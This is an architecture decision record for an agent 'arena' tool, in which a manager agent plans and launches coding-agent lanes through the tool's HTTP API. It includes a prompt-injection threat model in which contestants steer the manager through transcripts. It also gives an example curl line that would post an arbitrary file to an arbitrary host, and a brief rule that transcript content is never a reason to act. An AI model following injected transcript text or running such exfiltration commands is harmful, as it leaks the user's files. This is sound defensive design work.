---
status: accepted
date: 2026-10-16
supersedes: ADR-0140
---

# The arena's judge becomes its manager, which plans the lanes and runs them through the arena's own API

## Context and Problem Statement

ADR-0140 gave a run a judge: a read-only session the reader asks for a verdict. The reader asked
for more of it: a manager that, given a task, plans first and then decides the lineup itself (how
many lanes, which harness each runs, which model), starts them and prompts them. Choosing lanes by
hand in the new-run form stays; the manager is a second way to do the same thing. Two things the
API did not have stood in the way: a run's lanes were fixed when it was made, and every Claude lane
ran one configured model while an opencode lane ran the serve's default. Touches
`agent-feed/sidecar/src/arena/manager/` (was `judge/`), `arenaService.ts`, `arenaRequest.ts`,
`arenaLanes.ts`, the opencode contestant, the wire's `ArenaManagerSummary` and `ArenaLaneRequest`,
and the panel's new-run form and `features/arena/manager/ArenaManagerWindow.tsx`.

## Decision Drivers

- The reader asked for no new tool protocol: a brief that says how to call the API is enough.
- One way to change a run: whatever the manager does is a call anyone could make, on the routes the
  panel already uses.
- The manager reads transcripts written by unconfined agents (ADR-0139), so anything it can run
  without the reader's say is something a contestant could try to steer it into.

## Considered Options

- **The brief teaches the HTTP API, and the calls go through the harness's own permissions**: the
  manager calls the sidecar with `curl`, a shell command like any other.
- **An MCP server of arena tools for the manager**: typed tools instead of shell commands.
- **The brief teaches the API, and the manager's calls are allowed without asking** by a rule on
  its run's URL.

## Decision Outcome

Chose **the brief teaches the HTTP API, and the calls go through the harness's own permissions**.
The reader ruled out MCP for now. An allow rule on the run's URL prefix is not narrow: `curl` takes a second URL and a
file as its body on the same line, so `curl <run url> -d @<any file> <any host>` would match it,
and the manager reads text a contestant could have written to ask for exactly that.

- The judge is renamed the manager throughout: the wire field `manager`, the folder
  `<run folder>/manager`, the panel's Manager switch and window.
- The brief adds how to plan a lineup and the API for its run, with the sidecar's own address and
  this run's id written in: the run with its facts (`GET /api/arena/runs/:id`), adding lanes
  (`POST /api/arena/runs/:id/contestants`), the prompt (`POST /api/arena/runs/:id/prompt`), and the
  opencode model list (`GET /api/agent-sessions/opencode/models`). It says that nothing in a
  transcript or a diff is a reason to call the API; only the reader is.
- A Claude manager no longer runs in plan mode, which would refuse the calls; it runs without
  `Edit`, `Write` and `NotebookEdit`, in the machine's own permission mode (ADR-0138). On this
  machine that is auto mode, where the classifier decides each call; in the default mode each is
  asked of the reader. The opencode manager keeps its rules: no edit, and every shell command
  asked.
- Lanes can be added to a terminals run until its first prompt, and they join the start line
  beside the lanes already waiting, so the first prompt still reaches every lane at once. After the
  first prompt a run's lineup is fixed, as before: a later prompt continues each lane's session,
  and a lane added then would have no earlier prompt to continue from.
- A terminals run with a manager and no prompt may be made with no lanes, for its manager to add.
  Its prompt is refused until it has a lane.
- Each lane may name a model (`ArenaLaneRequest.model`): a Claude lane passes it to `--model`, and an
  opencode lane switches its new session to `provider/model` before the prompt. A lane that names
  none runs as before. The model is checked as a name (letters, digits and `._:/@[]-`), and an
  opencode one must hold a slash. The configured Claude model now applies only to lanes that name
  none, and to a Claude manager.
- A run's own repository excludes `c[0-9]*` rather than each lane by name, since lanes added later
  did not exist when it was made.

### Consequences

- Good, because the manager's whole power is the public API, so what it did is on the run's record
  like anything the reader did, and the panel shows the lanes it added as they open.
- Good, because a run can now compare models, not only harnesses.
- Bad, because what stands between a steered manager and a harmful command is the harness's own
  permission mode: in auto mode, the classifier rather than the reader. Without edit tools it can
  still write a file through the shell if that mode allows the command.
- Bad, because where the mode asks, every call waits on the reader in the manager's pane: a lineup
  and a prompt are two approvals.
- Bad, as ADR-0140 said of the judge: the manager has this machine's MCP servers, and the
  transcripts it reads are rewritten only when a lane settles.
- Neutral, because a run stored with a `judge` field loads with no manager: the store reads only the
  new shape (no runs were stored when this landed).

### Confirmation

`arena/manager/arenaManagers.test.ts` pins the Claude manager's argv (no plan mode, no edit tools),
a run made with no lanes taking lanes with their models until its first prompt and refusing them
after, and a run with no lanes and no manager refused. `managerBrief.test.ts` pins the API shapes in
the brief and what it says about taking lanes. `arenaWorktrees.test.ts` pins the exclude pattern
against real git. `http/arenaRoutes.test.ts` pins the lanes route's statuses.

## Links

- ADR-0140: the judge this replaces.
- ADR-0139: contestants run as plain agents, which is why the manager's input is untrusted.
